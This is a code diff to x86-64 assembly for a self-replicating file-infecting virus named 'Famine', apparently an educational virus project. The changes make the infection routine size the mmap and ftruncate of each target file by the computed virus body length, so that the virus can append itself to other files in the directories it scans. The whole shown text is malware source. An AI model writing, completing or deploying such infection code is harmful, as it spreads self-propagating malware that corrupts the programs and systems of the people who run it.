@@ -24,7 +24,7 @@ section .text
     lea rbx, _finish
     sub rbx, rax
     mov VAR(Famine.virus_size), rbx
-`
+
     ;load dirs
     lea rdi, [dirs]
 
@@ -159,7 +159,8 @@ section .text
                 ; mmap size : original_len + 0x4000. After ftruncate, writes are OK
                 xor rax, rax
                 mov eax, dword VAR(Famine.file_original_len)
-                add rax, 0x4000
+                mov rcx, VAR(Famine.virus_size)
+                add rax, rcx
 
                 ; mmap(NULL, file_original_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_file, 0)
                 mov rdi, 0x0
@@ -207,7 +208,8 @@ section .text
                     mov rdi, VAR(Famine.fd_file)
                     xor rax, rax
                     mov eax, dword VAR(Famine.file_original_len)
-                    add rax, 0x4000
+                    mov rcx, VAR(Famine.virus_size)
+                    add rax, rcx
                     mov r13, rax
                     mov rsi, rax
                     mov rax, SC_FTRUNCATE
@@ -219,7 +221,8 @@ section .text
 
                     ; offset penúltimo byte
                     mov ecx, dword VAR(Famine.file_original_len)
-                    add rcx, 0x4000
+                    mov rdx, VAR(Famine.virus_size)
+                    add rcx, rdx
                     dec rcx               ; penúltimo byte
                     add rax, rcx          ; rax = mmap_ptr + total_size - 1
 
